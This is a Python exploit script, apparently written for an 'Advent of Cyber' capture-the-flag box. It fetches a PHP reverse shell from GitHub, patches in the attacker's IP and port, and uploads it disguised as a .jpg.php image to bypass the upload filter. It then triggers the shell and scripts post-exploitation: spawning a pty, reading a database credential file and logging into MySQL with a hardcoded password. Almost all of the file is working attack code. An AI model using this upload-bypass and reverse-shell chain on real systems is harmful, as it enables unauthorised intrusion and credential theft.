import requests
import base64
import time
import subprocess
import argparse

global coloured
def coloured(r, g, b, text):
    return "\033[38;2;{};{};{}m{} \033[38;2;255;255;255m".format(r, g, b, text)

class Netcat:
	def __init__(self,myIp, myPort, machineIp):
		self.myIp = myIp
		self.myPort = myPort
		self.machineIp = machineIp
		self.machinePort = "65000"
		self.out = None

		self.uploadUrl = f"http://{self.machineIp}:{self.machinePort}/api/upload"
		self.fname = 'revshell'

	def prepareFile(self, file=None):
		print(coloured(0,0,255,"[+] Preparing uploadable Reverse Shell..."))
		if not file:
			print(coloured(0,0,255, "[+] Fetching files..."))
			file = requests.get("https://raw.githubusercontent.com/g13net/PwnBerryPi/master/src/pentest/revshells/revshell.php").text.split("\n")
		file[48] = f"$ip = '{self.myIp}';"
		file[49] = f"$port = '{self.myPort}';"

		file = "\n".join(file).encode("ascii")
		file = str(base64.b64encode(file).decode("ascii"))
		file = {
			"name":f"{self.fname}.jpg.php",
			"file":f"data:image/jpeg;base64,{file}"
		}
		return file

	def uploadFile(self, session, file):
		print(coloured(0,0,255,"[+] Uploading revshell..."))
		try:	
			response = session.post(self.uploadUrl, json = file, timeout=10)
		except:
			print(coloured(255,0,0,"[-] Upload failed. Make sure the host is up."))
			exit(0)
		print(coloured(0,255,0,"[+] Uploaded"))
	def catchShell(self):
		file = self.prepareFile()
		response = self.uploadFile(requests.Session(), file)

		print(coloured(0,0,255,f"[+] Listen in {self.myPort} and hit enter..."))
		input()
		print(coloured(0,0,255, "[+] Executing revshell...."))
		time.sleep(2)
		try:
			requests.get(f"http://{self.machineIp}:{self.machinePort}/grid/{self.fname}.jpg.php").text
		except:
			print(coloured(255,0,0,"[-] Failed to execute uploaded script."))

class postExploitation:
	def __init__(self, revshell):
		self.revshell = revshell
	def getWebTxt(self):
		self.revshell.stdin.write("cat /var/www/web.txt\n")
	def mySqlExploitation(self):
		self.revshell.stdin.write('python3 -c "import pty;pty.spawn(\'/bin/bash\')"\n')
		self.revshell.stdin.write('pwd\n')
		self.stdin.write('python3 -c \'l = open("/var/www/TheGrid/includes/dbauth.php","r").read().split("\\n")[2:5];print("\\n");[print(j) for j in [l[i].strip() for i in range(len(l))]]\'\n')
		self.revshell.stdin.write('mysql -utron -pIFightForTheUsers\n')
		self.revshell.stdin.write('IFightForTheUsers\n')
		# self.revshell.stdin.write('\n')
if __name__ == "__main__":

	print("Advent of cyber reverse shell catcher...\nUsage: python lastRoom.py <local_ip> <local_port> <box_ip>\n")
	parser = argparse.ArgumentParser(description="Exploit final box...")
	parser.add_argument('-mip', type=str, help="Provide your local ip..")
	parser.add_argument('-mport', type=str, help="Provide your local port for reverse shell...")
	parser.add_argument('-bip', type=str, help="Provide deployed box ip")
	nc = Netcat(parser.parse_args().mip, parser.parse_args().mport,parser.parse_args().bip)
	nc.catchShell()